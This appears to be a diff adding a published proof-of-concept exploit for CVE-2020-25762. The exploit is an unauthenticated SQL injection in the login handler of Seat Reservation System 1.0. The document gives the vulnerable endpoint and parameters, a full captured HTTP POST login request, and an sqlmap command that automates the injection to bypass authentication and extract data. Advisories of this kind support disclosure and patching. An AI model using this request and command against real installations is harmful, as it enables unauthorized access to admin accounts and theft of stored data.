@@ -1,0 +1,42 @@
+# Title: Seat Reservation System 1.0 - Unauthenticated SQL Injection
+# Exploit Author: Rahul Ramkumar
+# Date: 2020-09-16
+# Vendor Homepage: www.sourcecodester.com
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/seat-reservation-system-using-php_0.zip
+# Version: 1.0
+# Tested On: Windows 10 Enterprise 1809 (x64_86) + XAMPP 7.2.33-1
+# CVE: CVE-2020-25762
+# Description
+
+The file admin_class.php does not perform input validation on the username and password parameters. An attacker can send malicious input in the post request to /admin/ajax.php?action=login and bypass authentication, extract sensitive information etc.
+
+#POC
+
+1) Navigate to the admin login page
+
+Example:
+
+http://192.168.1.72/seat_reservation/admin/login.php
+
+2) Fill in dummy values for 'username' and 'password' fields and send the request via an HTTP intercept tool
+
+3) Save the request to file. Example, seat_reservation_sqli.req
+
+POST /seat_reservation/admin/ajax.php?action=login HTTP/1.1
+Host: 192.168.1.72
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 32
+Origin: http://192.168.1.72
+DNT: 1
+Connection: close
+
+username=admin&password=dummy
+
+4) Run SQLmap on the file,
+
+sqlmap -r seat_reservation_sqli.req --dbms=mysql --threads=10
